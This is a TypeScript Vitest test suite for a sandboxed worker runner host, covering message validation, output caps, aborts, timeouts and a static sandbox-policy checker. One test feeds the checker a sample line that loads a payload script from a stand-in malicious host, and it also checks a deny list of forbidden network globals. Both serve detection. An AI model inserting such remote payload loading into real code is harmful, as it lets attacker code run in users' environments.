import { describe, it, expect } from 'vitest'
import fs from 'node:fs'
import path from 'node:path'
import { Worker as ThreadWorker } from 'node:worker_threads'
import { WorkerRunnerHost, type WorkerLike } from '../../core/runner/workerHost'
import {
  isHostRunMessage,
  isWorkerMessage,
  type HostRunMessage,
  type RunInput,
  type RunResult,
  type WorkerMessage,
} from '../../core/runner/types'
import {
  checkWorkerSandboxPolicy,
  FORBIDDEN_WORKER_GLOBALS,
} from '../../core/runner/sandboxPolicy'

const REPO_ROOT = path.resolve(__dirname, '..', '..', '..')

function getResultMessage(result: RunResult): string | undefined {
  return result.status !== 'ok' ? result.message : undefined
}

/**
 * Creates a mock in-memory worker for controlled protocol testing.
 */
function createMockWorker(
  handler?: (msg: unknown, worker: WorkerLike) => void
): { worker: WorkerLike; messagesSent: unknown[]; terminated: boolean } {
  const messagesSent: unknown[] = []
  let terminated = false

  const worker: WorkerLike = {
    onmessage: null,
    onerror: null,
    postMessage(msg: unknown) {
      messagesSent.push(msg)
      if (handler) {
        handler(msg, worker)
      }
    },
    terminate() {
      terminated = true
    },
  }

  return { worker, messagesSent, get terminated() { return terminated } }
}

/**
 * Real multithreaded worker adapter wrapping node:worker_threads.
 * This runs on a separate OS thread, allowing genuine tests of infinite loops
 * and verifying that the main thread event loop remains unblocked.
 */
function createRealThreadWorker(script: string): WorkerLike {
  const thread = new ThreadWorker(script, { eval: true })

  const worker: WorkerLike = {
    onmessage: null,
    onerror: null,
    postMessage(msg: unknown) {
      thread.postMessage(msg)
    },
    terminate() {
      thread.terminate()
    },
  }

  thread.on('message', (data: unknown) => {
    if (worker.onmessage) {
      worker.onmessage({ data } as MessageEvent)
    }
  })

  thread.on('error', (err: Error) => {
    if (worker.onerror) {
      worker.onerror(new ErrorEvent('error', { error: err, message: err.message }))
    }
  })

  return worker
}

describe('Stage 20a: Worker Runner Host (PLT-05)', () => {
  describe('1. Schema Validation Protocols', () => {
    it('isHostRunMessage validates valid run messages and rejects malformed inputs', () => {
      const valid: HostRunMessage = {
        type: 'run',
        files: [{ name: 'main.js', language: 'javascript', content: 'console.log(1)' }],
        stdin: 'input data',
        limits: { timeoutMs: 1000, maxOutputBytes: 4096 },
      }
      expect(isHostRunMessage(valid)).toBe(true)

      expect(isHostRunMessage(null)).toBe(false)
      expect(isHostRunMessage({})).toBe(false)
      expect(isHostRunMessage({ type: 'other' })).toBe(false)
      expect(isHostRunMessage({ type: 'run', files: 'not-an-array' })).toBe(false)
      expect(isHostRunMessage({ type: 'run', files: [{ name: 123 }] })).toBe(false)
      expect(isHostRunMessage({ type: 'run', files: [], limits: { timeoutMs: 'bad' } })).toBe(false)
    })

    it('isWorkerMessage validates worker response messages and rejects malformed types', () => {
      const okResult: WorkerMessage = {
        type: 'result',
        status: 'ok',
        stdout: 'output',
        durationMs: 42,
      }
      expect(isWorkerMessage(okResult)).toBe(true)

      const logMsg: WorkerMessage = {
        type: 'log',
        stream: 'stdout',
        data: 'line 1\n',
      }
      expect(isWorkerMessage(logMsg)).toBe(true)

      const errMsg: WorkerMessage = {
        type: 'error',
        message: 'SyntaxError',
        durationMs: 12,
      }
      expect(isWorkerMessage(errMsg)).toBe(true)

      expect(isWorkerMessage({ type: 'result', status: 'unknown' })).toBe(false)
      expect(isWorkerMessage({ type: 'log', stream: 'other' })).toBe(false)
      expect(isWorkerMessage({ type: 'error', message: 123 })).toBe(false)
    })

    it('host rejects malformed input files array immediately', async () => {
      const host = new WorkerRunnerHost(() => createMockWorker().worker)
      const res = await host.run({} as unknown as RunInput)
      expect(res.status).toBe('error')
      expect(getResultMessage(res)).toContain('Invalid run input')
    })

    it('host handles malformed message from worker gracefully', async () => {
      const { worker } = createMockWorker((_msg, w) => {
        setTimeout(() => {
          if (w.onmessage) {
            w.onmessage({ data: { type: 'bogus_protocol' } } as MessageEvent)
          }
        }, 10)
      })

      const host = new WorkerRunnerHost(() => worker)
      const res = await host.run({
        files: [{ name: 'main.js', language: 'javascript', content: '' }],
      })

      expect(res.status).toBe('error')
      expect(getResultMessage(res)).toContain('Malformed message')
    })
  })

  describe('2. Output Limits Enforcement (64 KiB cap)', () => {
    it('kills worker when streaming log output exceeds maxOutputBytes', async () => {
      let terminated = false
      const worker: WorkerLike = {
        onmessage: null,
        onerror: null,
        postMessage(_msg) {
          setTimeout(() => {
            if (worker.onmessage) {
              // Send 300 bytes of logs when limit is 200 bytes
              const chunk = 'a'.repeat(150)
              worker.onmessage({ data: { type: 'log', stream: 'stdout', data: chunk } } as MessageEvent)
              worker.onmessage({ data: { type: 'log', stream: 'stdout', data: chunk } } as MessageEvent)
            }
          }, 10)
        },
        terminate() {
          terminated = true
        },
      }

      const host = new WorkerRunnerHost(() => worker)
      const res = await host.run({
        files: [{ name: 'main.js', language: 'javascript', content: '' }],
        limits: { maxOutputBytes: 200, timeoutMs: 1000 },
      })

      expect(res.status).toBe('memory')
      expect(getResultMessage(res)).toContain('Output limit of 200 bytes exceeded')
      expect(terminated).toBe(true)
    })

    it('kills worker when final result output exceeds maxOutputBytes', async () => {
      let terminated = false
      const worker: WorkerLike = {
        onmessage: null,
        onerror: null,
        postMessage(_msg) {
          setTimeout(() => {
            if (worker.onmessage) {
              worker.onmessage({
                data: {
                  type: 'result',
                  status: 'ok',
                  stdout: 'x'.repeat(1000),
                  durationMs: 10,
                },
              } as MessageEvent)
            }
          }, 10)
        },
        terminate() {
          terminated = true
        },
      }

      const host = new WorkerRunnerHost(() => worker)
      const res = await host.run({
        files: [{ name: 'main.js', language: 'javascript', content: '' }],
        limits: { maxOutputBytes: 500, timeoutMs: 1000 },
      })

      expect(res.status).toBe('memory')
      expect(getResultMessage(res)).toContain('Output limit of 500 bytes exceeded')
      expect(terminated).toBe(true)
    })
  })

  describe('3. AbortSignal Enforcement', () => {
    it('returns error immediately if AbortSignal is already aborted', async () => {
      const controller = new AbortController()
      controller.abort()

      const host = new WorkerRunnerHost(() => createMockWorker().worker)
      const res = await host.run(
        { files: [{ name: 'main.js', language: 'javascript', content: '' }] },
        controller.signal
      )

      expect(res.status).toBe('error')
      expect(getResultMessage(res)).toBe('Execution aborted')
    })

    it('terminates running worker when AbortSignal triggers mid-execution', async () => {
      const controller = new AbortController()
      let terminated = false

      const worker: WorkerLike = {
        onmessage: null,
        onerror: null,
        postMessage(_msg) {
          // Do not reply immediately; simulate running task
          setTimeout(() => {
            controller.abort()
          }, 20)
        },
        terminate() {
          terminated = true
        },
      }

      const host = new WorkerRunnerHost(() => worker)
      const res = await host.run(
        { files: [{ name: 'main.js', language: 'javascript', content: '' }] },
        controller.signal
      )

      expect(res.status).toBe('error')
      expect(getResultMessage(res)).toBe('Execution aborted')
      expect(terminated).toBe(true)
    })
  })

  describe('4. Worker Error Handling', () => {
    it('handles worker.onerror event by terminating worker and returning error', async () => {
      let terminated = false
      const worker: WorkerLike = {
        onmessage: null,
        onerror: null,
        postMessage(_msg) {
          setTimeout(() => {
            if (worker.onerror) {
              worker.onerror(new ErrorEvent('error', { message: 'Uncaught Worker Error' }))
            }
          }, 10)
        },
        terminate() {
          terminated = true
        },
      }

      const host = new WorkerRunnerHost(() => worker)
      const res = await host.run({
        files: [{ name: 'main.js', language: 'javascript', content: '' }],
      })

      expect(res.status).toBe('error')
      expect(getResultMessage(res)).toContain('Uncaught Worker Error')
      expect(terminated).toBe(true)
    })

    it('handles worker factory instantiation failure cleanly', async () => {
      const host = new WorkerRunnerHost(() => {
        throw new Error('Worker sandbox creation denied')
      })

      const res = await host.run({
        files: [{ name: 'main.js', language: 'javascript', content: '' }],
      })

      expect(res.status).toBe('error')
      expect(getResultMessage(res)).toContain('Worker sandbox creation denied')
    })
  })

  describe('5. Real Thread Timeout & Main Thread Responsiveness (Acceptance §13)', () => {
    it('infinite-loop code is killed within timeout + 250ms and main thread stays responsive', async () => {
      // Worker thread code that spins forever in an infinite loop
      const workerThreadCode = `
        const { parentPort } = require('node:worker_threads');
        parentPort.on('message', (msg) => {
          // Spin forever
          while (true) {}
        });
      `

      const timeoutMs = 200
      const host = new WorkerRunnerHost(() => createRealThreadWorker(workerThreadCode))

      // Track main-thread responsiveness via interval timer
      let mainThreadTicks = 0
      const tickInterval = setInterval(() => {
        mainThreadTicks++
      }, 30)

      const start = performance.now()
      const res = await host.run({
        files: [{ name: 'infinite.js', language: 'javascript', content: 'while(true){}' }],
        limits: { timeoutMs, maxOutputBytes: 1024 },
      })
      const elapsed = performance.now() - start
      clearInterval(tickInterval)

      // Verification of Acceptance Criterion §13:
      // 1. Result status is timeout
      expect(res.status).toBe('timeout')
      expect(getResultMessage(res)).toContain('timed out after 200ms')

      // 2. Terminated within timeout + 250ms (200ms + 250ms = 450ms)
      expect(elapsed).toBeLessThanOrEqual(timeoutMs + 250)

      // 3. Main thread remained responsive during the infinite loop execution
      expect(
        mainThreadTicks,
        `Main thread should tick during worker execution (got ${mainThreadTicks})`
      ).toBeGreaterThanOrEqual(2)
    })
  })

  describe('6. Static Sandbox Policy & Isolation Checks (§7 step 3)', () => {
    it('checkWorkerSandboxPolicy detects all forbidden globals and network APIs', () => {
      for (const forbidden of FORBIDDEN_WORKER_GLOBALS) {
        const dirtySource = `const x = ${forbidden}.someProp;`
        const check = checkWorkerSandboxPolicy(dirtySource)
        expect(check.ok).toBe(false)
        expect(check.violations.some((v) => v.includes(forbidden))).toBe(true)
      }

      // External importScripts check
      const dirtyImport = `importScripts('https://malicious.com/payload.js');`
      const checkImport = checkWorkerSandboxPolicy(dirtyImport)
      expect(checkImport.ok).toBe(false)
      expect(checkImport.violations.length).toBeGreaterThan(0)
    })

    it('workerEntry.ts passes sandbox policy check with zero violations', () => {
      const entryPath = path.resolve(REPO_ROOT, 'src', 'core', 'runner', 'workerEntry.ts')
      expect(fs.existsSync(entryPath)).toBe(true)

      const content = fs.readFileSync(entryPath, 'utf8')
      const result = checkWorkerSandboxPolicy(content)

      expect(
        result.ok,
        `workerEntry.ts violates sandbox policy: ${result.violations.join(', ')}`
      ).toBe(true)
      expect(result.violations).toEqual([])
    })

    it('workerHost.ts passes sandbox policy check with zero forbidden worker APIs', () => {
      const hostPath = path.resolve(REPO_ROOT, 'src', 'core', 'runner', 'workerHost.ts')
      expect(fs.existsSync(hostPath)).toBe(true)

      const content = fs.readFileSync(hostPath, 'utf8')
      const result = checkWorkerSandboxPolicy(content)

      expect(
        result.ok,
        `workerHost.ts violates sandbox policy: ${result.violations.join(', ')}`
      ).toBe(true)
      expect(result.violations).toEqual([])
    })
  })
})
